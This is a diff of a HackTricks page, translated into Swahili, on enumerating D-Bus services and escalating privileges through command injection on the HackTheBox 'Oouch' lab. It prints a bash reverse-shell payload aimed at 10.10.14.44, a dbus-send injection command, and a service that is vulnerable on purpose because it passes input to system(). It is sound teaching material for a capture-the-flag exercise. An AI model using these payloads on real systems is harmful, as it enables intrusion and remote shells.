@@ -1,27 +1,27 @@
-# Uchambuzi wa D-Bus & Upelelezi wa Amri na Upelekezaji wa Amri
+# D-Bus Enumeration & Command Injection Privilege Escalation
 
 {% hint style="success" %}
-Jifunze na zoezi la AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze na zoezi la GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-## **Uchambuzi wa GUI**
+## **GUI enumeration**
 
-D-Bus hutumiwa kama mpatanishi wa mawasiliano kati ya michakato (IPC) katika mazingira ya desktop ya Ubuntu. Kwenye Ubuntu, operesheni za wakati mmoja za mabasi kadhaa ya ujumbe zinaonekana: basi la mfumo, linalotumiwa hasa na **huduma zenye mamlaka kufunua huduma zinazofaa kote kwenye mfumo**, na basi la kikao kwa kila mtumiaji aliyeingia, linalofunua huduma zinazofaa tu kwa mtumiaji huyo maalum. Kuzingatia hapa ni hasa kwenye basi la mfumo kutokana na uhusiano wake na huduma zinazoendeshwa kwa mamlaka ya juu (k.m., root) kwa sababu lengo letu ni kukuza mamlaka. Inabainika kuwa usanifu wa D-Bus unatumia 'router' kwa kila basi la kikao, ambayo inahusika na kupelekeza ujumbe wa mteja kwenye huduma sahihi kulingana na anwani iliyotajwa na wateja kwa huduma wanayotaka kuwasiliana nayo.
+D-Bus inatumika kama mjumbe wa mawasiliano kati ya michakato (IPC) katika mazingira ya desktop ya Ubuntu. Katika Ubuntu, uendeshaji wa pamoja wa mabasi kadhaa ya ujumbe unashuhudiwa: basi la mfumo, ambalo linatumika hasa na **huduma zenye mamlaka kutoa huduma zinazohusiana katika mfumo mzima**, na basi la kikao kwa kila mtumiaji aliyeingia, likitoa huduma zinazohusiana tu na mtumiaji huyo maalum. Mwelekeo hapa ni hasa kwenye basi la mfumo kutokana na uhusiano wake na huduma zinazotumia mamlaka ya juu (mfano, root) kwani lengo letu ni kuinua mamlaka. Inabainika kwamba usanifu wa D-Bus unatumia 'router' kwa kila basi la kikao, ambayo inawajibika kwa kuelekeza ujumbe wa wateja kwa huduma zinazofaa kulingana na anwani iliyotolewa na wateja kwa huduma wanayotaka kuwasiliana nayo.
 
-Huduma kwenye D-Bus zinatambuliwa na **vitu** na **interfaces** wanazofunua. Vitu vinaweza kulinganishwa na mifano ya darasa katika lugha za OOP za kawaida, kila mifano ikitambuliwa kwa kipekee na **njia ya kitu**. Njia hii, kama njia ya mfumo wa faili, inatambua kila kitu kinachofunuliwa na huduma. Kiolesura muhimu kwa madhumuni ya utafiti ni **org.freedesktop.DBus.Introspectable** interface, ikionyesha njia moja, Introspect. Njia hii inarudisha uwakilishi wa XML wa njia zinazoungwa mkono na kitu, ishara, na mali, na kuzingatia hapa kwenye njia wakati wa kupuuza mali na ishara.
+Huduma kwenye D-Bus zin defined na **vitu** na **mifumo** wanayotoa. Vitu vinaweza kulinganishwa na mifano ya darasa katika lugha za OOP za kawaida, ambapo kila mfano unatambulika kwa kipekee na **njia ya kitu**. Njia hii, kama njia ya mfumo wa faili, inatambulisha kipekee kila kitu kinachotolewa na huduma. Msingi muhimu wa utafiti ni **org.freedesktop.DBus.Introspectable** interface, yenye njia moja, Introspect. Njia hii inarudisha uwakilishi wa XML wa njia zinazoungwa mkono za kitu, ishara, na mali, huku ikizingatia hapa njia huku ikiacha mali na ishara.
 
-Kwa mawasiliano na kiolesura cha D-Bus, zana mbili zilitumiwa: zana ya CLI inayoitwa **gdbus** kwa wito rahisi wa njia zinazofunuliwa na D-Bus katika hati za maandishi, na [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), zana ya GUI iliyoandikwa kwa Python iliyoundwa kuchambua huduma zinazopatikana kwenye kila basi na kuonyesha vitu vilivyomo ndani ya kila huduma.
+Kwa mawasiliano na kiolesura cha D-Bus, zana mbili zilitumika: zana ya CLI inayoitwa **gdbus** kwa urahisi wa kuitisha njia zinazotolewa na D-Bus katika scripts, na [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), zana ya GUI inayotumia Python iliyoundwa kuorodhesha huduma zinazopatikana kwenye kila basi na kuonyesha vitu vilivyomo ndani ya kila huduma.
 ```bash
 sudo apt-get install d-feet
 ```
@@ -30,21 +30,21 @@ sudo apt-get install d-feet
 ![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)
 
 
-Katika picha ya kwanza huduma zilizosajiliwa na basi la mfumo la D-Bus zinaonyeshwa, na **org.debin.apt** ikisisitizwa hasa baada ya kuchagua kitufe cha Basi la Mfumo. D-Feet inauliza huduma hii kwa vitu, ikionyesha viunganishi, njia, mali, na ishara kwa vitu vilivyochaguliwa, vinavyoonekana katika picha ya pili. Saini ya kila njia pia imeelezewa.
+Katika picha ya kwanza, huduma zilizoorodheshwa na mfumo wa D-Bus zinaonyeshwa, huku **org.debin.apt** ikisisitizwa hasa baada ya kuchagua kitufe cha System Bus. D-Feet inachunguza huduma hii kwa vitu, ikionyesha interfaces, methods, properties, na signals za vitu vilivyochaguliwa, kama inavyoonekana katika picha ya pili. Saini ya kila method pia imeelezwa kwa undani.
 
-Kipengele kinachoweza kuzingatiwa ni kuonyesha **kitambulisho cha mchakato (pid)** na **mstari wa amri**, muhimu kwa kuthibitisha ikiwa huduma inaendeshwa na mamlaka ya juu, muhimu kwa uhusiano wa utafiti.
+Kipengele muhimu ni kuonyeshwa kwa **process ID (pid)** na **command line** ya huduma, ambayo ni muhimu kuthibitisha ikiwa huduma inafanya kazi na haki za juu, muhimu kwa umuhimu wa utafiti.
 
-**D-Feet pia inaruhusu wito wa njia**: watumiaji wanaweza kuingiza maneno ya Python kama parameta, ambayo D-Feet inabadilisha kuwa aina za D-Bus kabla ya kuzipitisha kwa huduma.
+**D-Feet pia inaruhusu mwito wa method**: watumiaji wanaweza kuingiza maelekezo ya Python kama vigezo, ambayo D-Feet inabadilisha kuwa aina za D-Bus kabla ya kupitisha kwa huduma.
 
-Hata hivyo, kumbuka kwamba **baadhi ya njia zinahitaji uthibitisho** kabla ya kuturuhusu kuziita. Tutapuuza njia hizi, kwani lengo letu ni kuboresha haki zetu bila vibali kwanza.
+Hata hivyo, kumbuka kwamba **method zingine zinahitaji uthibitisho** kabla ya kuturuhusu kuzitumia. Tutazipuuza method hizi, kwani lengo letu ni kuongeza haki zetu bila hati za kuingia kwanza.
 
-Pia eleza kwamba baadhi ya huduma huzululiza huduma nyingine ya D-Bus inayoitwa org.freedeskto.PolicyKit1 ikiwa mtumiaji anapaswa kuruhusiwa kufanya vitendo fulani au la.
+Pia kumbuka kwamba baadhi ya huduma zinachunguza huduma nyingine ya D-Bus inayoitwa org.freedeskto.PolicyKit1 ikiwa mtumiaji anapaswa kuruhusiwa kufanya vitendo fulani au la.
 
-## **Uorodheshaji wa Amri za Cmd**
+## **Cmd line Enumeration**
 
-### Orodhesha Vitu vya Huduma
+### Orodha ya Vitu vya Huduma
 
-Inawezekana kuorodhesha viunganishi vilivyofunguliwa vya D-Bus na:
+Inawezekana kuorodhesha interfaces za D-Bus zilizofunguliwa kwa:
 ```bash
 busctl list #List D-Bus interfaces
 
@@ -68,13 +68,13 @@ org.freedesktop.PolicyKit1               - -               -                (act
 org.freedesktop.hostname1                - -               -                (activatable) -                         -
 org.freedesktop.locale1                  - -               -                (activatable) -                         -
 ```
-#### Uunganisho
+#### Connections
 
-[Kutoka kwa wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Wakati mchakato unapoweka uhusiano na basi, basi humpa uhusiano jina maalum la basi linaloitwa _jina la kipekee la uhusiano_. Majina ya basi ya aina hii hayawezi kubadilishwa - inahakikishiwa kuwa hayatabadilika muda mrefu uhusiano upo - na, zaidi ya yote, haviwezi kutumika tena wakati wa maisha ya basi. Hii inamaanisha kuwa hakuna uhusiano mwingine kwenye basi hilo ambao utapewa jina la kipekee la uhusiano, hata kama mchakato huo huo unafunga uhusiano na basi na kuunda mpya. Majina ya kipekee ya uhusiano ni rahisi kutambulika kwa sababu huanza na herufi ya—ambayo kwa kawaida ni marufuku—ya mkato. 
+[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Wakati mchakato unapoanzisha muunganisho na basi, basi inatoa muunganisho jina maalum la basi linaloitwa _jina la muunganisho la kipekee_. Majina ya basi ya aina hii hayabadiliki—imehakikishwa hayatabadilika kadri muunganisho unavyokuwepo—na, muhimu zaidi, hayawezi kutumika tena wakati wa maisha ya basi. Hii inamaanisha kwamba hakuna muunganisho mwingine kwa basi hiyo utapata jina kama hilo la muunganisho wa kipekee, hata kama mchakato huo huo unafunga muunganisho na kuunda mpya. Majina ya muunganisho wa kipekee yanaweza kutambulika kwa urahisi kwa sababu yananza na tabia ya koloni—ambayo kwa kawaida inakatazwa.
 
-### Taarifa ya Kitu cha Huduma
+### Service Object Info
 
-Kisha, unaweza kupata habari fulani kuhusu kiolesura na:
+Kisha, unaweza kupata taarifa fulani kuhusu kiolesura kwa:
 ```bash
 busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface
 
@@ -134,7 +134,7 @@ cap_mknod cap_lease cap_audit_write cap_audit_control
 cap_setfcap cap_mac_override cap_mac_admin cap_syslog
 cap_wake_alarm cap_block_suspend cap_audit_read
 ```
-### Orodhesha Interface za Kitu cha Huduma
+### Orodha ya Mifumo ya Kihuduma
 
 Unahitaji kuwa na ruhusa za kutosha.
 ```bash
@@ -144,9 +144,9 @@ busctl tree htb.oouch.Block #Get Interfaces of the service object
 └─/htb/oouch
 └─/htb/oouch/Block
 ```
-### Angalia Kiolesura cha Kitu cha Huduma
+### Introspect Interface of a Service Object
 
-Tazama jinsi katika mfano huu ilivyochaguliwa kiolesura cha hivi karibuni kilichogunduliwa kwa kutumia parameter ya `tree` (_angalia sehemu iliyopita_):
+Kumbuka jinsi katika mfano huu ilichaguliwa interface ya hivi punde iliyogunduliwa kwa kutumia parameter ya `tree` (_ona sehemu iliyopita_):
 ```bash
 busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface
 
@@ -164,23 +164,25 @@ org.freedesktop.DBus.Properties     interface -         -            -
 .Set                                method    ssv       -            -
 .PropertiesChanged                  signal    sa{sv}as  -            -
 ```
-### Kufuatilia/ Kukamata Kiolesura
+Note njia `.Block` ya interface `htb.oouch.Block` (ile ambayo tunavutiwa nayo). "s" ya safu nyingine inaweza kumaanisha kwamba inatarajia string.
 
-Ukiwa na mamlaka za kutosha (mamlaka ya `send_destination` na `receive_sender` pekee sio za kutosha) unaweza **kufuatilia mawasiliano ya D-Bus**.
+### Monitor/Capture Interface
 
-Ili **kufuatilia** **mawasiliano** utahitaji kuwa **root**. Ikiwa bado unaona matatizo kuwa root angalia [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) na [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
+Kwa ruhusa za kutosha (tu `send_destination` na `receive_sender` ruhusa hazitoshi) unaweza **kuchunguza mawasiliano ya D-Bus**.
+
+Ili **kuchunguza** **mawasiliano** unahitaji kuwa **root.** Ikiwa bado unakutana na matatizo ukiwa root angalia [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) na [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
 
 {% hint style="warning" %}
-Ikiwa unajua jinsi ya configure faili ya usanidi ya D-Bus ili **kuruhusu watumiaji wasio na mamlaka ya kuchunguza** mawasiliano tafadhali **wasiliana nami**!
+Ikiwa unajua jinsi ya kuunda faili ya usanidi ya D-Bus ili **kuruhusu watumiaji wasiokuwa root kunusa** mawasiliano tafadhali **wasiliana nami**!
 {% endhint %}
 
-Njia tofauti za kufuatilia:
+Njia tofauti za kuchunguza:
 ```bash
 sudo busctl monitor htb.oouch.Block #Monitor only specified
 sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
 sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
 ```
-Katika mfano ufuatao kiolesura `htb.oouch.Block` kinachunguzwa na **ujumbe "**_**lalalalal**_**" hutumwa kupitia mawasiliano mabaya**:
+Katika mfano ufuatao, kiolesura `htb.oouch.Block` kinachunguzwa na **ujumbe "**_**lalalalal**_**" unatumwa kupitia mawasiliano mabaya**:
 ```bash
 busctl monitor htb.oouch.Block
 
@@ -199,13 +201,15 @@ MESSAGE "s" {
 STRING "Carried out :D";
 };
 ```
-#### Kuchuja kelele zote <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
+You can use `capture` instead of `monitor` to save the results in a pcap file.
 
-Ikiwa kuna habari nyingi sana kwenye basi, pitisha sheria ya kupatana kama ifuatavyo:
+#### Filtering all the noise <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
+
+Ikiwa kuna taarifa nyingi sana kwenye basi, pitisha sheria ya mechi kama ifuatavyo:
 ```bash
 dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
 ```
-Multiple rules can be specified. If a message matches _any_ of the rules, the message will be printed. Like so:
+Mifumo mingi inaweza kufafanuliwa. Ikiwa ujumbe unalingana na _yoyote_ ya mifumo, ujumbe utaonyeshwa. Kama hivi:
 ```bash
 dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```
@@ -213,13 +217,13 @@ dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```bash
 dbus-monitor "type=method_call" "type=method_return" "type=error"
 ```
-Tazama [nyaraka ya D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) kwa maelezo zaidi kuhusu sintaksia ya sheria za mechi.
+Tazama [dokumenti ya D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) kwa maelezo zaidi kuhusu sintaksia ya sheria za mechi.
 
 ### Zaidi
 
-`busctl` ina chaguo zaidi, [**pata yote hapa**](https://www.freedesktop.org/software/systemd/man/busctl.html).
+`busctl` ina chaguzi zaidi, [**pata zote hapa**](https://www.freedesktop.org/software/systemd/man/busctl.html).
 
-## **Hali ya Kudhoofika**
+## **Hali ya Hatari**
 
 Kama mtumiaji **qtc ndani ya mwenyeji "oouch" kutoka HTB** unaweza kupata **faili ya usanidi ya D-Bus isiyotarajiwa** iliyoko _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
 ```xml
@@ -242,9 +246,9 @@ Kama mtumiaji **qtc ndani ya mwenyeji "oouch" kutoka HTB** unaweza kupata **fail
 
 </busconfig>
 ```
-Tafadhali kumbuka kutoka kwenye mazingira ya awali kwamba **utahitaji kuwa mtumiaji `root` au `www-data` ili kutuma na kupokea habari** kupitia mawasiliano ya D-BUS haya.
+Kumbuka kutoka kwenye usanidi wa awali kwamba **utahitaji kuwa mtumiaji `root` au `www-data` ili kutuma na kupokea taarifa** kupitia mawasiliano haya ya D-BUS.
 
-Kama mtumiaji **qtc** ndani ya kontena la docker **aeb4525789d8** unaweza kupata nambari fulani inayohusiana na dbus kwenye faili _/code/oouch/routes.py._ Hii ndio nambari inayovutia:
+Kama mtumiaji **qtc** ndani ya kontena la docker **aeb4525789d8** unaweza kupata baadhi ya msimbo unaohusiana na dbus katika faili _/code/oouch/routes.py._ Huu ndio msimbo wa kuvutia:
 ```python
 if primitive_xss.search(form.textfield.data):
 bus = dbus.SystemBus()
@@ -256,14 +260,14 @@ response = block_iface.Block(client_ip)
 bus.close()
 return render_template('hacker.html', title='Hacker')
 ```
-Kama unavyoona, ni **kuunganisha kwa kiolesura cha D-Bus** na kutuma kwa **kazi ya "Block"** "client\_ip".
+Kama unavyoona, inafanya **kuungana na kiolesura cha D-Bus** na kutuma kwa **"Block" function** "client\_ip".
 
-Upande mwingine wa uhusiano wa D-Bus kuna faili iliyoundwa kwa C inayotumika. Msimbo huu unakuwa **ukisikiliza** kwenye uhusiano wa D-Bus **kwa anwani ya IP na kuita iptables kupitia kazi ya `system`** kuzuia anwani ya IP iliyotolewa.\
-**Wito wa `system` una kasoro kwa makusudi ya kuingiza amri**, hivyo mzigo kama huu utaunda kabati la kurudi: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
+Katika upande mwingine wa muunganisho wa D-Bus kuna binary iliyokamilishwa kwa C inayoendesha. Hii code inafanya **kusikiliza** katika muunganisho wa D-Bus **kwa anwani ya IP na inaita iptables kupitia `system` function** kuzuia anwani ya IP iliyotolewa.\
+**Kuitwa kwa `system` kuna hatari kwa makusudi kwa ajili ya kuingilia amri**, hivyo payload kama ifuatavyo itaunda shell ya kurudi: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
 
-### Tumia mwanya huo
+### Fanya hivyo
 
-Mwishoni mwa ukurasa huu unaweza kupata **mimbo kamili ya C ya programu ya D-Bus**. Ndani yake unaweza kupata kati ya mistari 91-97 **jinsi `njia ya kitu cha D-Bus`** **na `jina la kiolesura`** vinavyo **sajiliwa**. Taarifa hii itakuwa muhimu kutuma taarifa kwa uhusiano wa D-Bus:
+Mwisho wa ukurasa huu unaweza kupata **kodi kamili ya C ya programu ya D-Bus**. Ndani yake unaweza kupata kati ya mistari 91-97 **jinsi ya `D-Bus object path`** **na `interface name`** **zinavyosajiliwa**. Taarifa hii itakuwa muhimu kutuma taarifa kwa muunganisho wa D-Bus:
 ```c
 /* Install the object */
 r = sd_bus_add_object_vtable(bus,
@@ -273,13 +277,13 @@ r = sd_bus_add_object_vtable(bus,
 block_vtable,
 NULL);
 ```
-Pia, kwenye mstari wa 57 unaweza kupata kwamba **njia pekee iliyosajiliwa** kwa mawasiliano haya ya D-Bus inaitwa `Block`(_**Ndiyo sababu katika sehemu inayofuata mizigo itatumwa kwa kitu cha huduma `htb.oouch.Block`, kiolesura `/htb/oouch/Block` na jina la njia `Block`**_):
+Pia, katika mstari wa 57 unaweza kupata kwamba **njia pekee iliyosajiliwa** kwa mawasiliano haya ya D-Bus inaitwa `Block`(_**Ndio maana katika sehemu inayofuata payloads zitatumwa kwa kitu cha huduma `htb.oouch.Block`, kiolesura `/htb/oouch/Block` na jina la njia `Block`**_):
 ```c
 SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 ```
 #### Python
 
-Msimbo wa python ufuatao utatuma mzigo kwenye uunganisho wa D-Bus kwa njia ya `Block` kupitia `block_iface.Block(runme)` (_kumbuka kwamba ulichimbuliwa kutoka kipande cha msimbo kilichotangulia_):
+Mfuatano wa msimbo wa python utatuma mzigo kwa muunganisho wa D-Bus kwa njia ya `Block` method kupitia `block_iface.Block(runme)` (_kumbuka kwamba ilitolewa kutoka sehemu ya awali ya msimbo_):
 ```python
 import dbus
 bus = dbus.SystemBus()
@@ -293,16 +297,16 @@ bus.close()
 ```bash
 dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
 ```
-* `dbus-send` ni chombo kinachotumika kutuma ujumbe kwa "Message Bus"
-* Message Bus - Programu inayotumiwa na mifumo kufanya mawasiliano kati ya maombi kwa urahisi. Inahusiana na Message Queue (ujumbe huwa katika mpangilio) lakini kwenye Message Bus ujumbe hutumwa kwa mfano wa usajili na pia haraka sana.
-* Lebo ya "-system" hutumiwa kutaja kuwa ni ujumbe wa mfumo, si ujumbe wa kikao (kwa chaguo-msingi).
-* Lebo ya "--print-reply" hutumiwa kuchapisha ujumbe wetu ipasavyo na kupokea majibu yoyote kwa muundo wa kibinadamu.
-* "--dest=Dbus-Interface-Block" Anwani ya kiolesura cha Dbus.
-* "--string:" - Aina ya ujumbe tunayotaka kutuma kwa kiolesura. Kuna miundo kadhaa ya kutuma ujumbe kama vile double, bytes, booleans, int, objpath. Kati ya hizi, "njia ya kitu" ni muhimu tunapotaka kutuma njia ya faili kwa kiolesura cha Dbus. Tunaweza kutumia faili maalum (FIFO) katika kesi hii kupitisha amri kwa kiolesura kwa jina la faili. "string:;" - Hii ni kuita njia ya kitu tena ambapo tunaweka faili ya shell ya FIFO/amri.
+* `dbus-send` ni chombo kinachotumika kutuma ujumbe kwa “Message Bus”
+* Message Bus – Programu inayotumiwa na mifumo kuwezesha mawasiliano kati ya programu kwa urahisi. Inahusiana na Message Queue (ujumbe umewekwa kwa mpangilio) lakini katika Message Bus ujumbe unatumwa kwa mfano wa usajili na pia ni wa haraka sana.
+* “-system” lebo inatumika kutaja kwamba ni ujumbe wa mfumo, si ujumbe wa kikao (kwa chaguo-msingi).
+* “–print-reply” lebo inatumika kuchapisha ujumbe wetu ipasavyo na kupokea majibu yoyote kwa muundo unaoweza kusomeka na binadamu.
+* “–dest=Dbus-Interface-Block” Anwani ya kiolesura cha Dbus.
+* “–string:” – Aina ya ujumbe tunayotaka kutuma kwa kiolesura. Kuna mifumo kadhaa ya kutuma ujumbe kama vile double, bytes, booleans, int, objpath. Kati ya hizi, “object path” ni muhimu tunapotaka kutuma njia ya faili kwa kiolesura cha Dbus. Tunaweza kutumia faili maalum (FIFO) katika kesi hii kupitisha amri kwa kiolesura kwa jina la faili. “string:;” – Hii ni kuitisha tena njia ya kitu ambapo tunaweka faili/amri ya FIFO reverse shell.
 
-_Tafadhali kumbuka kwamba katika `htb.oouch.Block.Block`, sehemu ya kwanza (`htb.oouch.Block`) inahusiana na kitu cha huduma na sehemu ya mwisho (`.Block`) inahusiana na jina la njia._
+_Kumbuka kwamba katika `htb.oouch.Block.Block`, sehemu ya kwanza (`htb.oouch.Block`) inarejelea kitu cha huduma na sehemu ya mwisho (`.Block`) inarejelea jina la mbinu._
 
-### Msimbo wa C
+### C code
 
 {% code title="d-bus_server.c" %}
 ```c
@@ -451,16 +455,16 @@ return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
 * [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
 
 {% hint style="success" %}
-Jifunze na zoezi la AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze na zoezi la GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
 * Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 {% endhint %}
